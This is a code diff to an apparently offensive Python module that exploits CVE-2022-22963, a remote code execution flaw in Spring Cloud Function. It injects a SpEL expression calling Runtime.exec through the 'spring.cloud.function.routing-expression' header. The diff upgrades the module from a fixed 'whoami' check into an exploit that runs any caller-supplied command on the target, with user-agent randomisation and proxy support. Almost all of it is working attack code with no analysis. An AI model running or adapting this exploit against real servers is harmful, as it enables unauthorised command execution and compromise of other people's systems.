@@ -7,9 +7,12 @@ class CVE_2022_22963:
     def __init__(self):
         ua = RandomUA.RandomUA()
         self.ua = ua.UserAgent()
-        self.payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'
 
         self.data = 'test'
+
+        self.path = 'functionRouter'
+    def poc(self,url,proxies,ProxyStute,cmd="whoami"):
+        self.payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
         self.header = {
             'spring.cloud.function.routing-expression': self.payload,
             'Accept-Encoding': 'gzip, deflate',
@@ -18,8 +21,6 @@ class CVE_2022_22963:
             'User-Agent': self.ua,
             'Content-Type': 'application/x-www-form-urlencoded'
         }
-        self.path = 'functionRouter'
-    def poc(self,url,proxies,ProxyStute):
         if ProxyStute == 1:
             proxies = proxies
         else:
@@ -34,7 +35,7 @@ class CVE_2022_22963:
             text = req.text
             rsp = '"error":"Internal Server Error"'
             if code == 500 and rsp in text:
-                result = f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹Shell'
+                result = f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，执行命令\n{cmd}'
                 return result
             else:
                 result = f'[-] {url} CVE-2022-22963漏洞不存在'
@@ -43,5 +44,6 @@ class CVE_2022_22963:
             error = f"[error] {url} 未知错误 {e}"
             return error
 
-    def exp(self,url,proxies,ProxyStute):
-        pass
+    def exp(self,url,proxies,ProxyStute,cmd):
+        result = self.poc(url,proxies,ProxyStute,cmd)
+        return result
